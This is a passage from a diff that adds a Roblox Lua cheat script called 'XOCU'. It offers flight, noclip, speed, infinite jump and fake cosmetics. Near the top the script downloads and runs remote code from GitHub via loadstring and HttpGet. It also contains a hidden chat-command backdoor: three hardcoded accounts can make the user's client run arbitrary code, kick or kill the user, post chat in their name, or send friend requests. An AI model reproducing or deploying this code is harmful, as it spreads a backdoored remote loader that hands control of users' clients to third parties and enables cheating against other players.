@@ -1,0 +1,2938 @@
+"
+local Players = game:GetService("Players")
+local LocalPlayer = Players.LocalPlayer
+local CoreGui = game:GetService("CoreGui")
+loadstring(game:HttpGet('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'))()
+local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/iavichbest/XOCU/refs/heads/main/idk"))()
+
+Players = game:GetService('Players')
+TweenService = game:GetService('TweenService')
+plr = Players.LocalPlayer
+gui = plr:WaitForChild('PlayerGui'):WaitForChild('MenuGui')
+TopRight = gui:WaitForChild('TopRight')
+CoinsFrame = TopRight:WaitForChild('CoinsFrame')
+CoinsDisplay = CoinsFrame:WaitForChild('CoinsDisplay')
+CoinImage = CoinsDisplay:WaitForChild('CoinImage')
+Coins = CoinsDisplay:WaitForChild('Coins')
+CoinsButton = CoinsFrame:WaitForChild('CoinsButton')
+
+for _, v in ipairs(CoinsFrame:GetChildren())do
+    if v:IsA('UICorner') or v:IsA('UIStroke') or v:IsA('UIPadding') or v:IsA('UIGradient') then
+        v:Destroy()
+    end
+end
+for _, v in ipairs(CoinsDisplay:GetChildren())do
+    if v:IsA('UIListLayout') then
+        v:Destroy()
+    end
+end
+
+blur = Instance.new('ImageLabel')
+blur.Name = 'GlassBlur'
+blur.BackgroundTransparency = 1
+blur.Size = UDim2.new(1, 0, 1, 0)
+blur.Position = UDim2.new(0, 0, 0, 0)
+blur.Image = 'rbxassetid://8992230677'
+blur.ImageTransparency = 0.88
+blur.ScaleType = Enum.ScaleType.Stretch
+blur.ZIndex = CoinsFrame.ZIndex - 1
+blur.Parent = CoinsFrame
+CoinsFrame.BackgroundColor3 = Color3.fromRGB(12, 14, 18)
+CoinsFrame.BackgroundTransparency = 0.35
+CoinsFrame.AutomaticSize = Enum.AutomaticSize.X
+CoinsFrame.Size = UDim2.new(0, 0, 0, 74)
+corner = Instance.new('UICorner')
+corner.CornerRadius = UDim.new(1, 0)
+corner.Parent = CoinsFrame
+padding = Instance.new('UIPadding')
+padding.PaddingLeft = UDim.new(0, 10)
+padding.PaddingRight = UDim.new(0, 10)
+padding.Parent = CoinsFrame
+stroke = Instance.new('UIStroke')
+stroke.Thickness = 1
+stroke.Transparency = 0.6
+stroke.Color = Color3.fromRGB(135, 206, 235)
+stroke.Parent = CoinsFrame
+borderGrad = Instance.new('UIGradient')
+borderGrad.Color = ColorSequence.new({
+    ColorSequenceKeypoint.new(0, Color3.fromRGB(135, 206, 235)),
+    ColorSequenceKeypoint.new(0.5, Color3.fromRGB(135, 206, 235)),
+    ColorSequenceKeypoint.new(1, Color3.fromRGB(135, 206, 235)),
+})
+borderGrad.Parent = stroke
+
+task.spawn(function()
+    while CoinsFrame.Parent do
+        for i = 0, 360, 1 do
+            borderGrad.Rotation = i
+
+            task.wait(0.02)
+        end
+    end
+end)
+TweenService:Create(CoinsFrame, TweenInfo.new(2.5, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut, -1, true), {BackgroundTransparency = 0.25}):Play()
+
+CoinsDisplay.BackgroundTransparency = 1
+CoinsDisplay.AutomaticSize = Enum.AutomaticSize.X
+CoinsDisplay.Size = UDim2.new(0, 0, 1, 0)
+
+local layout = Instance.new('UIListLayout')
+
+layout.FillDirection = Enum.FillDirection.Horizontal
+layout.VerticalAlignment = Enum.VerticalAlignment.Center
+layout.HorizontalAlignment = Enum.HorizontalAlignment.Left
+layout.Padding = UDim.new(0, 6)
+layout.SortOrder = Enum.SortOrder.LayoutOrder
+layout.Parent = CoinsDisplay
+Coins.LayoutOrder = 1
+Coins.BackgroundTransparency = 1
+Coins.AutomaticSize = Enum.AutomaticSize.X
+Coins.TextXAlignment = Enum.TextXAlignment.Left
+Coins.TextYAlignment = Enum.TextYAlignment.Center
+Coins.Font = Enum.Font.GothamBold
+Coins.TextSize = 34
+Coins.Text = tostring(Coins.Text)
+
+local textGrad = Instance.new('UIGradient')
+
+textGrad.Color = ColorSequence.new({
+    ColorSequenceKeypoint.new(0, Color3.fromRGB(135, 206, 235)),
+    ColorSequenceKeypoint.new(0.5, Color3.fromRGB(135, 206, 235)),
+    ColorSequenceKeypoint.new(1, Color3.fromRGB(135, 206, 235)),
+})
+textGrad.Parent = Coins
+
+task.spawn(function()
+    while Coins.Parent do
+        for i = 0, 360, 2 do
+            textGrad.Rotation = i
+
+            task.wait(0.03)
+        end
+    end
+end)
+
+CoinImage.LayoutOrder = 2
+CoinImage.BackgroundTransparency = 1
+CoinImage.Size = UDim2.new(0, 64, 0, 64)
+CoinImage.ImageColor3 = Color3.fromRGB(135, 206, 235)
+CoinImage.AnchorPoint = Vector2.new(0, 0.5)
+CoinImage.Position = UDim2.new(0, 0, 0.5, 0)
+
+task.defer(function()
+    CoinImage.Image = 'rbxassetid://6031094678'
+end)
+TweenService:Create(CoinImage, TweenInfo.new(2.2, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut, -1, true), {
+    Position = CoinImage.Position + UDim2.new(0, 0, 0, -4),
+}):Play()
+
+CoinsButton.BackgroundTransparency = 1
+CoinsButton.Text = ''
+CoinsButton.Size = UDim2.new(1, 0, 1, 0)
+CoinsButton.ZIndex = CoinsFrame.ZIndex + 5
+
+function tween(obj, ti, props)
+    TweenService:Create(obj, ti, props):Play()
+end
+
+CoinsButton.MouseEnter:Connect(function()
+    tween(stroke, TweenInfo.new(0.2), {Transparency = 0.15})
+    tween(CoinImage, TweenInfo.new(0.2), {
+        ImageColor3 = Color3.fromRGB(135, 206, 235),
+    })
+end)
+CoinsButton.MouseLeave:Connect(function()
+    tween(stroke, TweenInfo.new(0.2), {Transparency = 0.6})
+    tween(CoinImage, TweenInfo.new(0.2), {
+        ImageColor3 = Color3.fromRGB(135, 206, 235),
+    })
+end)
+CoinsButton.MouseButton1Down:Connect(function()
+    tween(CoinsFrame, TweenInfo.new(0.08), {
+        Size = UDim2.new(0, 0, 0, 71),
+    })
+end)
+CoinsButton.MouseButton1Up:Connect(function()
+    tween(CoinsFrame, TweenInfo.new(0.2, Enum.EasingStyle.Back), {
+        Size = UDim2.new(0, 0, 0, 74),
+    })
+end)
+
+Players = game:GetService('Players')
+RunService = game:GetService('RunService')
+TextChatService = game:GetService('TextChatService')
+LocalPlayer = Players.LocalPlayer or Players:GetPropertyChangedSignal('LocalPlayer'):Wait()
+RBXGeneral = TextChatService.TextChannels:FindFirstChild('RBXGeneral')
+scriptedPlayers = {}
+scriptedPlayers[LocalPlayer] = true
+
+local superAdmins = {
+    kshopnakub_2271 = true,
+    MNHET_XOCU = true,
+    gpoikhfgy = true,
+}
+local admins = {}
+local tempAdmins = {}
+
+function sendLines(player, lines, perMessage)
+    perMessage = perMessage or 4
+
+    for i = 1, #lines, perMessage do
+        local chunk = {}
+
+        for j = i, math.min(i + perMessage - 1, #lines)do
+            table.insert(chunk, lines[j])
+        end
+
+        local text = table.concat(chunk, '\n')
+
+        game:GetService('ReplicatedStorage').DefaultChatSystemChatEvents.SayMessageRequest:FireServer(text, 'All')
+        task.wait(0.25)
+    end
+end
+
+local commandHelp = {
+    '.chat (Target) (Text)',
+    '.bring (Target)',
+    '.kill (Target)',
+    '.kick (Target)',
+    '.freeze (Target)',
+    '.thaw (Target)',
+    '.spin (Target)',
+    '.unspin',
+    '.fps (Target) (Cap)',
+    '.friend (Target)',
+    '.unfriend (Target)',
+    '.admin (Target)',
+    '.revoke (Target)',
+    '.exec (Target) (Code)',
+    '.reveal (Target) (All)',
+    '.credits',
+    '.blind (Target)',
+    '.cmds',
+}
+local frozenPlayers = {}
+
+function getRole(name)
+    if superAdmins[name] then
+        return 'superadmin'
+    elseif admins[name] or tempAdmins[name] then
+        return 'admin'
+    else
+        return 'user'
+    end
+end
+function resolveTargets(input)
+    if not input then
+        return {}
+    end
+
+    input = input:lower()
+
+    local results = {}
+
+    if input == 'all' then
+        for player in pairs(scriptedPlayers)do
+            table.insert(results, player)
+        end
+
+        return results
+    end
+
+    for _, plr in ipairs(Players:GetPlayers())do
+        local uname = plr.Name:lower()
+        local dname = (plr.DisplayName or ''):lower()
+
+        if uname:sub(1, #input) == input or dname:sub(1, #input) == input then
+            table.insert(results, plr)
+        end
+    end
+
+    return results
+end
+function toggleBlock(player, enable)
+    local char = player.Character
+    local hrp = char and char:FindFirstChild('HumanoidRootPart')
+
+    if not hrp then
+        return
+    end
+    if enable then
+        if not hrp:FindFirstChild('Block') then
+            local bv = Instance.new('BodyVelocity')
+
+            bv.Name = 'Block'
+            bv.MaxForce = Vector3.new(math.huge, math.huge, math.huge)
+            bv.Velocity = Vector3.zero
+            bv.Parent = hrp
+        end
+    else
+        local bv = hrp:FindFirstChild('Block')
+
+        if bv then
+            bv:Destroy()
+        end
+    end
+end
+function freezePlayer(player, enable)
+    if not scriptedPlayers[player] then
+        return
+    end
+
+    local char = player.Character
+    local hrp = char and char:FindFirstChild('HumanoidRootPart')
+
+    if hrp then
+        hrp.Anchored = enable
+    end
+end
+
+local spin = false
+local spinTarget = nil
+
+function sendToChat(msg)
+    if RBXGeneral and msg then
+        pcall(function()
+            RBXGeneral:SendAsync(msg)
+        end)
+    end
+end
+function handleMessage(sender, text)
+    local senderRole = getRole(sender.Name)
+
+    if senderRole == 'user' then
+        return
+    end
+
+    local args = {}
+
+    for word in text:gmatch('%S+')do
+        table.insert(args, word)
+    end
+
+    if #args < 1 then
+        return
+    end
+
+    local cmd = args[1]:lower()
+    local targets = resolveTargets(args[2])
+
+    if cmd == '.chat' then
+        local msg = table.concat(args, ' ', 3)
+
+        if msg ~= '' then
+            for _, target in ipairs(targets)do
+                if target == LocalPlayer then
+                    sendToChat(msg)
+                end
+            end
+        end
+    elseif cmd == '.kick' then
+        local reason = table.concat(args, ' ', 3)
+
+        if reason == '' then
+            reason = 'No Reason was applied.'
+        end
+
+        for _, target in ipairs(targets)do
+            local message = 'Kicked by: ' .. sender.DisplayName .. ' (@' .. sender.Name .. ')\n' .. 'Reason: ' .. reason
+
+            target:Kick(message)
+        end
+    elseif cmd == '.wither' then
+        witheringheights()
+    elseif cmd == '.kill' then
+        for _, target in ipairs(targets)do
+            local hum = target.Character and target.Character:FindFirstChildOfClass('Humanoid')
+
+            if hum then
+                hum.Health = 0
+            end
+        end
+    elseif cmd == '.bring' then
+        for _, target in ipairs(targets)do
+            local hrp = target.Character and target.Character:FindFirstChild('HumanoidRootPart')
+            local senderHRP = sender.Character and sender.Character:FindFirstChild('HumanoidRootPart')
+
+            if hrp and senderHRP then
+                hrp.CFrame = senderHRP.CFrame + Vector3.new(0, 0, -3)
+
+                toggleBlock(target, true)
+                task.delay(1, function()
+                    toggleBlock(target, false)
+                end)
+            end
+        end
+    elseif cmd == '.spin' then
+        spin = true
+        spinTarget = targets[1]
+    elseif cmd == '.unspin' then
+        spin = false
+        spinTarget = nil
+    elseif cmd == '.fps' then
+        local cap = tonumber(args[3])
+
+        if cap and setfpscap then
+            setfpscap(cap)
+        end
+    elseif cmd == '.fling' then
+        for _, target in ipairs(targets)do
+            local myHRP = LocalPlayer.Character and LocalPlayer.Character:FindFirstChild('HumanoidRootPart')
+            local tHRP = target.Character and target.Character:FindFirstChild('HumanoidRootPart')
+
+            if myHRP and tHRP then
+                myHRP.CFrame = tHRP.CFrame
+
+                task.wait()
+
+                myHRP.Velocity = Vector3.new(9999, 9999, 9999)
+            end
+        end
+    elseif cmd == '.freeze' then
+        for _, target in ipairs(targets)do
+            frozenPlayers[target] = true
+
+            freezePlayer(target, true)
+        end
+    elseif cmd == '.thaw' then
+        for _, target in ipairs(targets)do
+            frozenPlayers[target] = nil
+
+            freezePlayer(target, false)
+        end
+    elseif cmd == '.friend' then
+        for _, target in ipairs(targets)do
+            if target ~= LocalPlayer then
+                pcall(function()
+                    LocalPlayer:RequestFriendship(target)
+                    sendToChat('friended ' .. target.Name)
+                end)
+            end
+        end
+    elseif cmd == '.unfriend' then
+        for _, target in ipairs(targets)do
+            if LocalPlayer:IsFriendsWith(target.UserId) then
+                pcall(function()
+                    LocalPlayer:RevokeFriendship(target)
+                    sendToChat('unfriended ' .. target.Name)
+                end)
+            end
+        end
+    elseif cmd == '.admin' then
+        if senderRole ~= 'superadmin' then
+            return
+        end
+
+        for _, target in ipairs(targets)do
+            if target and not superAdmins[target.Name] then
+                tempAdmins[target.Name] = true
+
+                sendToChat(target.DisplayName .. ' (@' .. target.Name .. ') is now whitelisted')
+            end
+        end
+    elseif cmd == '.revoke' then
+        if senderRole ~= 'superadmin' then
+            return
+        end
+
+        for _, target in ipairs(targets)do
+            if tempAdmins[target.Name] then
+                tempAdmins[target.Name] = nil
+
+                sendToChat(target.DisplayName .. ' (@' .. target.Name .. ') is no longer whitelisted')
+            end
+        end
+    elseif cmd == '.exec' then
+        if senderRole ~= 'superadmin' then
+            return
+        end
+
+        local code = table.concat(args, ' ', 3)
+
+        if code ~= '' and targets[1] == LocalPlayer then
+            local fn, err = loadstring(code)
+
+            if fn then
+                pcall(fn)
+            else
+                warn(err)
+            end
+        end
+    elseif cmd == '.cmds' then
+        local chunkSize = 4
+
+        for i = 1, #commandHelp, chunkSize do
+            local chunk = {}
+
+            for j = i, math.min(i + chunkSize - 1, #commandHelp)do
+                table.insert(chunk, commandHelp[j])
+            end
+
+            sendToChat(table.concat(chunk, '\n'))
+            task.wait(0.25)
+        end
+    elseif cmd == '.reveal' then
+        for _, target in ipairs(targets)do
+            if target == LocalPlayer then
+                sendToChat('XOCU TUFF')
+            end
+        end
+    elseif cmd == '.blind' then
+        for _, target in ipairs(targets)do
+            if target == LocalPlayer then
+                local gui = Instance.new('ScreenGui', game.CoreGui)
+                local frame = Instance.new('Frame', gui)
+
+                frame.Size = UDim2.new(1, 0, 1, 0)
+                frame.BackgroundColor3 = Color3.new(0, 0, 0)
+
+                task.delay(5, function()
+                    gui:Destroy()
+                end)
+            end
+        end
+    elseif cmd == '.credits' then
+        for _, target in ipairs(targets)do
+            if target == LocalPlayer then
+                sendToChat('CREDITS: Made by XOCU and 9rr')
+            end
+        end
+    end
+end
+function connectPlayer(player)
+    player.Chatted:Connect(function(msg)
+        handleMessage(player, msg)
+    end)
+end
+
+for _, player in ipairs(Players:GetPlayers())do
+    connectPlayer(player)
+end
+
+Players.PlayerAdded:Connect(connectPlayer)
+RunService.Heartbeat:Connect(function()
+    if not spin or not spinTarget then
+        return
+    end
+
+    local hrp = LocalPlayer.Character and LocalPlayer.Character:FindFirstChild('HumanoidRootPart')
+    local targetHRP = spinTarget.Character and spinTarget.Character:FindFirstChild('HumanoidRootPart')
+
+    if hrp and targetHRP then
+        local a = tick() * 2
+
+        hrp.CFrame = targetHRP.CFrame * CFrame.new(math.cos(a) * 8, 2, math.sin(a) * 8)
+    end
+end)
+
+-- Global state storage
+local ToggleStates = {}
+function SetToggleState(flag, value) ToggleStates[flag] = value end
+function GetToggleState(flag) return ToggleStates[flag] or false end
+local Toggles = Library.Flags or Library.Items or {}
+local Options = Library.Items or Library.Flags or {}
+local Window = Library:CreateWindow({
+	Title = "XOCU",
+    Theme = {
+        Font = "SciFi",
+        ImageTransparency = 5,
+        BGTransparency = 100,
+        BackgroundID = "131726780467000",
+        Main = Color3.fromRGB(8, 10, 15),
+        Second = Color3.fromRGB(1, 7, 32),
+        ElementAccent = Color3.fromRGB(69, 28, 28),
+        TextColor = Color3.fromRGB(124, 122, 255),
+        GradientStart = Color3.fromRGB(86, 120, 249),
+        GradientEnd = Color3.fromRGB(0, 255, 0),
+        CornerRadius = 12,
+        HudTransparency = 25
+    },
+	ToggleKey = Enum.KeyCode.RightShift,
+	Transparency = 0.25,
+	ShowWatermark = {Enabled = true, Title = true, User = true, FPS = true, Duration = false, Ping = true},
+	AutoSave = true,
+	ConfigFolder = "XOCU_Config",
+    UiScale = 1.0,
+    CustomIcon = "82269833034303"
+})
+local Tabs = {
+    Main = Window:CreateTab("Main", true, "6023426915"),
+	Defense = Window:CreateTab("Defense", true, "96097489556461"),
+	Target = Window:CreateTab("Target", true, "10360632826"),
+	Grab = Window:CreateTab("Grab", true, "17313314020"), 
+	Player = Window:CreateTab("Player", true, "2795572803"),
+    Server = Window:CreateTab("Server", true, "6023426925"),
+    Toy = Window:CreateTab("Toys", true, "9682067800"),
+	Misc = Window:CreateTab("Misc", true, "114167292947807"), 
+    Figure = Window:CreateTab("Figure", true, "10826661578"),
+	Keybinds = Window:CreateTab("Keybinds", true, "11710306257"), 
+	Visuals  = Window:CreateTab("Visuals",  true, "112488114197106"),
+}
+local MainV = Tabs.Main:CreateBlock({Name = "Value", true, Side = "Left"})
+local MainL = Tabs.Main:CreateBlock({Name = "Main", true, Side = "Left"})
+local MainR = Tabs.Main:CreateBlock({Name = "Others", true, Side = "Right"})
+local SoundGroup = Tabs.Main:CreateBlock({Name = "Others", true, Side = "Right"})
+
+
+local spinningConnection = nil
+local spinSpeed = 5
+
+local PL_SpeedEnabled = false
+local PL_SpeedValue = 16
+local PL_SpeedConn = nil
+
+local jpEnabled = false
+local jpValue = 50
+local jpConn = nil
+
+local infJumpEnabled = false
+local noclipEnabled = false
+local noclipConnection = nil
+
+MainL:CreateToggle({
+    Name = "Spin Character",
+    Flag = "Spin Character",
+    Default = false,
+    Callback = function(Value)
+        SetToggleState("Spin Character", Value)
+        if Value then
+            spinningConnection = R.Heartbeat:Connect(function()
+                local character = Player.Character
+                local root = character and character:FindFirstChild("HumanoidRootPart")
+                if root then
+                    root.CFrame = root.CFrame * CFrame.Angles(0, math.rad(spinSpeed), 0)
+                end
+            end)
+        else
+            if spinningConnection then
+                spinningConnection:Disconnect()
+                spinningConnection = nil
+            end
+        end
+    end
+})
+
+MainV:CreateSlider({
+    Name = "Spin Speed",
+    Flag = "Spin Speed",
+    Default = 5,
+    Min = 1,
+    Max = 50,
+    Callback = function(Value)
+        spinSpeed = Value
+    end
+})
+
+MainL:CreateToggle({
+    Name = "Walkspeed",
+    Flag = "Walkspeed",
+    Default = false,
+    Callback = function(Value)
+        SetToggleState("Walkspeed", Value)
+        PL_SpeedEnabled = Value
+        if Value then
+            if PL_SpeedConn then PL_SpeedConn:Disconnect() end
+            PL_SpeedConn = RunService.RenderStepped:Connect(function()
+                if not PL_SpeedEnabled then return end
+                local char = LocalPlayer.Character
+                local hrp = char and char:FindFirstChild("HumanoidRootPart")
+                local hum = char and char:FindFirstChild("Humanoid")
+                if hrp and hum then
+                    hrp.CFrame = hrp.CFrame + hum.MoveDirection * (PL_SpeedValue * 0.1)
+                end
+            end)
+        else
+            if PL_SpeedConn then
+                PL_SpeedConn:Disconnect()
+                PL_SpeedConn = nil
+            end
+        end
+    end
+})
+
+MainV:CreateSlider({
+    Name = "Walk Speed",
+    Flag = "Walk Speed",
+    Default = 16,
+    Min = 1,
+    Max = 1000,
+    Callback = function(Value)
+        PL_SpeedValue = Value
+    end
+})
+
+MainL:CreateToggle({
+    Name = "Jump Power",
+    Flag = "Jump Power",
+    Default = false,
+    Callback = function(Value)
+        SetToggleState("Jump Power", Value)
+        jpEnabled = Value
+        if Value then
+            if jpConn then jpConn:Disconnect() end
+            jpConn = RunService.Heartbeat:Connect(function()
+                if not jpEnabled then return end
+                local char = LocalPlayer.Character
+                local hum = char and char:FindFirstChild("Humanoid")
+                if hum then
+                    hum.JumpPower = jpValue
+                end
+            end)
+        else
+            if jpConn then
+                jpConn:Disconnect()
+                jpConn = nil
+            end
+            local char = LocalPlayer.Character
+            local hum = char and char:FindFirstChild("Humanoid")
+            if hum then
+                hum.JumpPower = 50
+            end
+        end
+    end
+})
+
+MainV:CreateSlider({
+    Name = "Jump Power Value",
+    Flag = "Jump Power Value",
+    Default = 50,
+    Min = 1,
+    Max = 1000,
+    Callback = function(Value)
+        jpValue = Value
+        if jpEnabled then
+            local char = LocalPlayer.Character
+            local hum = char and char:FindFirstChild("Humanoid")
+            if hum then
+                hum.JumpPower = jpValue
+            end
+        end
+    end
+})
+
+do
+    local Players = game:GetService("Players")
+    local RunService = game:GetService("RunService")
+    local UIS = game:GetService("UserInputService")
+    
+    local plr = Players.LocalPlayer
+    local cons = cons or {}
+
+    local FlightSettings = {
+        Enabled = false,
+        Speed = 50,
+        BodyVelocity = nil,
+        BodyGyro = nil,
+        FlightConnection = nil,
+        CurrentVelocity = Vector3.new(0, 0, 0),
+        IsInVehicle = false,
+    }
+
+    local function cleanupFlight()
+        if FlightSettings.FlightConnection then
+            FlightSettings.FlightConnection:Disconnect()
+            FlightSettings.FlightConnection = nil
+        end
+        
+        if FlightSettings.BodyVelocity then
+            FlightSettings.BodyVelocity:Destroy()
+            FlightSettings.BodyVelocity = nil
+        end
+        
+        if FlightSettings.BodyGyro then
+            FlightSettings.BodyGyro:Destroy()
+            FlightSettings.BodyGyro = nil
+        end
+        
+        local char = plr.Character
+        if char then
+            local humanoid = char:FindFirstChild("Humanoid")
+            if humanoid and not FlightSettings.IsInVehicle then
+                humanoid.PlatformStand = false
+            end
+        end
+    end
+
+    local function getFlightTarget()
+        local char = plr.Character
+        if not char then return nil end
+        
+        local humanoid = char:FindFirstChild("Humanoid")
+        if not humanoid then return nil end
+        
+        if humanoid.Sit then
+            FlightSettings.IsInVehicle = true
+            local seat = humanoid.SeatPart
+            if seat and seat.Parent then
+                return seat.Parent:FindFirstChild("HumanoidRootPart") or seat
+            end
+        end
+        
+        FlightSettings.IsInVehicle = false
+        return char:FindFirstChild("HumanoidRootPart")
+    end
+
+    local function applyFlightPhysics()
+        local targetPart = getFlightTarget()
+        if not targetPart then return end
+        
+        cleanupFlight()
+        
+        FlightSettings.BodyVelocity = Instance.new("BodyVelocity")
+        FlightSettings.BodyVelocity.MaxForce = Vector3.new(math.huge, math.huge, math.huge)
+        FlightSettings.BodyVelocity.Velocity = Vector3.new(0, 0, 0)
+        FlightSettings.BodyVelocity.P = 10000
+        FlightSettings.BodyVelocity.Parent = targetPart
+        
+        FlightSettings.BodyGyro = Instance.new("BodyGyro")
+        FlightSettings.BodyGyro.MaxTorque = Vector3.new(math.huge, math.huge, math.huge)
+        FlightSettings.BodyGyro.CFrame = targetPart.CFrame
+        FlightSettings.BodyGyro.P = 10000
+        FlightSettings.BodyGyro.Parent = targetPart
+        
+        local char = plr.Character
+        if char then
+            local humanoid = char:FindFirstChild("Humanoid")
+            if humanoid and not FlightSettings.IsInVehicle then
+                humanoid.PlatformStand = true
+            end
+        end
+        
+        FlightSettings.CurrentVelocity = Vector3.new(0, 0, 0)
+        
+        FlightSettings.FlightConnection = RunService.Heartbeat:Connect(function()
+            if not FlightSettings.Enabled then
+                cleanupFlight()
+                return
+            end
+            
+            local currentTarget = getFlightTarget()
+            if not currentTarget or not currentTarget.Parent then
+                return
+            end
+            
+            if FlightSettings.BodyVelocity and FlightSettings.BodyVelocity.Parent ~= currentTarget then
+                applyFlightPhysics()
+                return
+            end
+            
+            local moveDir = Vector3.new(0, 0, 0)
+            local Camera = workspace.CurrentCamera
+            
+            if UIS:IsKeyDown(Enum.KeyCode.W) then moveDir = moveDir + Camera.CFrame.LookVector end
+            if UIS:IsKeyDown(Enum.KeyCode.S) then moveDir = moveDir - Camera.CFrame.LookVector end
+            if UIS:IsKeyDown(Enum.KeyCode.A) then moveDir = moveDir - Camera.CFrame.RightVector end
+            if UIS:IsKeyDown(Enum.KeyCode.D) then moveDir = moveDir + Camera.CFrame.RightVector end
+            if UIS:IsKeyDown(Enum.KeyCode.Space) then moveDir = moveDir + Vector3.new(0, 1, 0) end
+            if UIS:IsKeyDown(Enum.KeyCode.LeftShift) then moveDir = moveDir - Vector3.new(0, 1, 0) end
+            
+            if moveDir.Magnitude > 0 then
+                moveDir = moveDir.Unit
+            end
+            
+            local targetVelocity = moveDir * FlightSettings.Speed
+            FlightSettings.CurrentVelocity = FlightSettings.CurrentVelocity:Lerp(targetVelocity, 0.2)
+            
+            if FlightSettings.BodyVelocity then
+                FlightSettings.BodyVelocity.Velocity = FlightSettings.CurrentVelocity
+            end
+            
+            if FlightSettings.BodyGyro then
+                FlightSettings.BodyGyro.CFrame = Camera.CFrame
+            end
+        end)
+    end
+
+    local function setFlightState(state)
+        FlightSettings.Enabled = state
+        if not state then
+            cleanupFlight()
+        else
+            applyFlightPhysics()
+        end
+    end
+
+    if cons["FlightRespawn"] then cons["FlightRespawn"]:Disconnect() end
+    cons["FlightRespawn"] = plr.CharacterAdded:Connect(function(char)
+        if FlightSettings.Enabled then
+            char:WaitForChild("HumanoidRootPart", 5)
+            task.wait(0.2)
+            if FlightSettings.Enabled then
+                applyFlightPhysics()
+            end
+        end
+    end)
+
+    MainL:CreateToggle({
+        Name = "Flight",
+        Flag = "FlyToggle",
+        Default = false,
+        Callback = function(v)
+            setFlightState(v)
+        end
+    })
+
+    MainV:CreateSlider({
+        Name = "Flight Speed",
+        Flag = "FlySpeed",
+        Min = 50,
+        Max = 10000,
+        Default = 200,
+        Callback = function(v)
+            FlightSettings.Speed = v
+        end
+    })
+end
+
+MainL:CreateToggle({
+    Name = "Water Walk",
+    Flag = "Water Walk",
+    Default = false,
+    Callback = function(v)
+        SetToggleState("Water Walk", v)
+        for i, vv in pairs(workspace.Map.AlwaysHereTweenedObjects.Ocean.Object.ObjectModel:GetChildren()) do
+            if vv.Name == "Ocean" then
+                vv.CanCollide = v
+            end
+        end
+    end
+})
+
+MainL:CreateToggle({
+    Name = "Noclip",
+    Flag = "Noclip",
+    Default = false,
+    Callback = function(Value)
+        noclipEnabled = Value
+        if noclipConnection then
+            noclipConnection:Disconnect()
+            noclipConnection = nil
+        end
+        if Value then
+            noclipConnection = RunService.Stepped:Connect(function()
+                local char = LocalPlayer.Character
+                if char then
+                    for _, part in pairs(char:GetDescendants()) do
+                        if part:IsA("BasePart") then
+                            part.CanCollide = false
+                        end
+                    end
+                end
+            end)
+        end
+    end
+})
+
+MainL:CreateToggle({
+    Name = "Inf Jump",
+    Flag = "Inf Jump",
+    Default = false,
+    Callback = function(Value)
+        infJumpEnabled = Value
+    end
+})
+
+UserInputService.JumpRequest:Connect(function()
+    if infJumpEnabled then
+        local char = LocalPlayer.Character
+        local humanoid = char and char:FindFirstChild("Humanoid")
+        if humanoid and humanoid:GetState() ~= Enum.HumanoidStateType.Jumping then
+            humanoid:ChangeState(Enum.HumanoidStateType.Jumping)
+        end
+    end
+end)
+
+do
+
+    local FakeCosmeticsEnabled = false
+    local RespawnPersist = false
+    local CosmeticChoice = "Both"
+
+    local KORBLOX_MESH_ID = "101851696"
+    local KORBLOX_TEX_ID = "101851254"
+    local HEADLESS_MESH_ID = "134082579"
+    local HEADLESS_TEX_ID = "134082627"
+
+    local SavedHeadData = nil
+
+    local function SnapshotHead()
+        local char = LocalPlayer.Character
+        if not char then return end
+        local head = char:FindFirstChild("Head")
+        if not head then return end
+        SavedHeadData = {
+            Transparency = head.Transparency,
+            BrickColor = head.BrickColor,
+            Material = head.Material,
+            Meshes = {},
+            Decals = {},
+        }
+        for _, obj in ipairs(head:GetChildren()) do
+            if obj:IsA("SpecialMesh") then
+                table.insert(SavedHeadData.Meshes, {
+                    MeshType = obj.MeshType,
+                    MeshId = obj.MeshId,
+                    TextureId = obj.TextureId,
+                    Scale = obj.Scale,
+                    Offset = obj.Offset,
+                    VertexColor = obj.VertexColor,
+                    Name = obj.Name,
+                })
+            elseif obj:IsA("Decal") then
+                table.insert(SavedHeadData.Decals, {
+                    Texture = obj.Texture,
+                    Face = obj.Face,
+                    Transparency = obj.Transparency,
+                    Name = obj.Name,
+                })
+            end
+        end
+    end
+
+    local function WearHeadless()
+        local char = LocalPlayer.Character
+        if not char then return end
+        local head = char:FindFirstChild("Head")
+        if not head then return end
+        SnapshotHead()
+        for _, obj in ipairs(head:GetChildren()) do
+            if obj:IsA("Decal") or obj:IsA("SpecialMesh") then obj:Destroy() end
+        end
+        local mesh = Instance.new("SpecialMesh")
+        mesh.MeshType = Enum.MeshType.FileMesh
+        mesh.MeshId = "rbxassetid://" .. HEADLESS_MESH_ID
+        mesh.TextureId = "rbxassetid://" .. HEADLESS_TEX_ID
+        mesh.Scale = Vector3.new(1.25, 1.25, 1.25)
+        mesh.Name = "PhantomHeadlessMesh"
+        mesh.Parent = head
+        head.Transparency = 0.1
+        head.BrickColor = BrickColor.new("Really black")
+        head.Material = Enum.Material.Plastic
+    end
+
+    local function WearKorblox()
+        local char = LocalPlayer.Character
+        if not char then return end
+        local rleg = char:FindFirstChild("Right Leg") or char:FindFirstChild("RightLowerLeg")
+        if not rleg then return end
+        local old = char:FindFirstChild("PhantomKorbloxLeg")
+        if old then old:Destroy() end
+        local fakeLeg = Instance.new("Part")
+        fakeLeg.Name = "PhantomKorbloxLeg"
+        fakeLeg.Size = rleg.Size
+        fakeLeg.CFrame = rleg.CFrame
+        fakeLeg.Anchored = false
+        fakeLeg.CanCollide = false
+        fakeLeg.Transparency = 0
+        fakeLeg.BrickColor = BrickColor.new("Really black")
+        fakeLeg.Material = Enum.Material.Plastic
+        fakeLeg.Parent = char
+        local mesh = Instance.new("SpecialMesh")
+        mesh.MeshType = Enum.MeshType.FileMesh
+        mesh.MeshId = "rbxassetid://" .. KORBLOX_MESH_ID
+        mesh.TextureId = "rbxassetid://" .. KORBLOX_TEX_ID
+        mesh.Scale = Vector3.new(1, 1, 1)
+        mesh.Parent = fakeLeg
+        local weld = Instance.new("WeldConstraint")
+        weld.Part0 = rleg
+        weld.Part1 = fakeLeg
+        weld.Parent = rleg
+        rleg.Transparency = 1
+    end
+
+    local function ApplyCosmetics()
+        local char = LocalPlayer.Character
+        if not char then return end
+        if CosmeticChoice == "Headless" then WearHeadless()
+        elseif CosmeticChoice == "Korblox" then WearKorblox()
+        elseif CosmeticChoice == "Both" then WearHeadless() WearKorblox() end
+    end
+
+    local function StripCosmetics()
+        local char = LocalPlayer.Character
+        if not char then return end
